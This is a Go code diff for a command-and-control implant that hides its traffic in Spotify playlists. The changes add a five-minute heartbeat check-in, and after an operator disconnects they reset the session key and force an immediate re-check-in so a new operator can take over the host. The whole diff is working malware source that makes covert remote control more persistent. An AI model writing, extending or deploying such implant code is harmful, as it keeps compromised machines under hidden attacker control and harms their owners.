@@ -35,6 +35,8 @@ type Implant struct {
 	writeFails     int // consecutive WRITE failures (checkin/results)
 	sessionID      string
 	clientID       string
+	lastCheckin    time.Time // when last checkin was sent
+	checkinInterval time.Duration // how often to re-send heartbeat checkins
 
 	// Async result delivery
 	resultCh chan *protocol.C2Message
@@ -80,16 +82,17 @@ func NewImplant(client *spotify.Client, key string, interval, jitter int) *Impla
 	fmt.Printf("[*] Polling every %d-%ds\n", interval-jitter, interval+jitter)
 	fmt.Printf("[*] Session: %s\n", sessionID[:12])
 	return &Implant{
-		client:        client,
-		key:           key,
-		interval:      interval,
-		jitter:        jitter,
-		processedSeqs: make(map[int]bool),
-		sessionID:     sessionID,
-		clientID:      clientID,
-		resultCh:      make(chan *protocol.C2Message, 32),
-		ephPriv:       ephPriv,
-		ephPub:        ephPub,
+		client:          client,
+		key:             key,
+		interval:        interval,
+		jitter:          jitter,
+		processedSeqs:   make(map[int]bool),
+		sessionID:       sessionID,
+		clientID:        clientID,
+		resultCh:        make(chan *protocol.C2Message, 32),
+		ephPriv:         ephPriv,
+		ephPub:          ephPub,
+		checkinInterval: 5 * time.Minute, // heartbeat every 5 min
 	}
 }
 
@@ -201,6 +204,7 @@ func (imp *Implant) sendCheckin() {
 	fmt.Printf("[*] Check-in sent (client_id=%s) at %s\n",
 		imp.clientID, time.Now().Format("15:04:05"))
 	imp.checkinPending = false
+	imp.lastCheckin = time.Now()
 }
 
 // isRateLimit checks if an error is a Spotify rate limit.
@@ -303,8 +307,12 @@ func (imp *Implant) Run() {
 	writeBackoffUntil := time.Time{} // when to retry writes
 
 	for {
-		// Retry checkin if pending AND write backoff expired
-		if imp.checkinPending && time.Now().After(writeBackoffUntil) {
+		// Re-send checkin if:
+		// 1. Failed previously (checkinPending)
+		// 2. Heartbeat interval elapsed (operator may have restarted)
+		needsCheckin := imp.checkinPending ||
+			time.Since(imp.lastCheckin) > imp.checkinInterval
+		if needsCheckin && time.Now().After(writeBackoffUntil) {
 			imp.sendCheckin()
 			if imp.checkinPending {
 				// Write failed again -- exponential backoff for writes only
@@ -435,16 +443,17 @@ func (imp *Implant) pollAndExecute() {
 		if msg.Module == "shutdown" {
 			_ = imp.client.CleanC2Playlists(ctx,
 				protocol.ChannelCmd, imp.key, seqNum)
-			fmt.Printf("\n\033[33m[!] Operator has disconnected at %s\033[0m\n",
+			fmt.Printf("\n\033[33m[!] Operator disconnected at %s\033[0m\n",
 				time.Now().Format("15:04:05"))
-			fmt.Println("\033[33m[!] Session terminated. Waiting for new operator...\033[0m")
-			fmt.Println("\033[33m[!] Restart implant for a new session key.\033[0m")
-			// Reset state -- stop executing, wait for restart
+			fmt.Println("\033[33m[!] Waiting for operator to reconnect...\033[0m")
+			// Reset forward secrecy (new operator will have different X25519 keys)
+			imp.sessionKey = nil
+			// Force immediate re-checkin so new operator sees us
 			imp.checkinPending = true
+			imp.lastCheckin = time.Time{}
 			imp.seqMu.Lock()
 			imp.processedSeqs = make(map[int]bool)
 			imp.seqMu.Unlock()
-			imp.sessionKey = nil // reset forward secrecy
 			continue
 		}
 
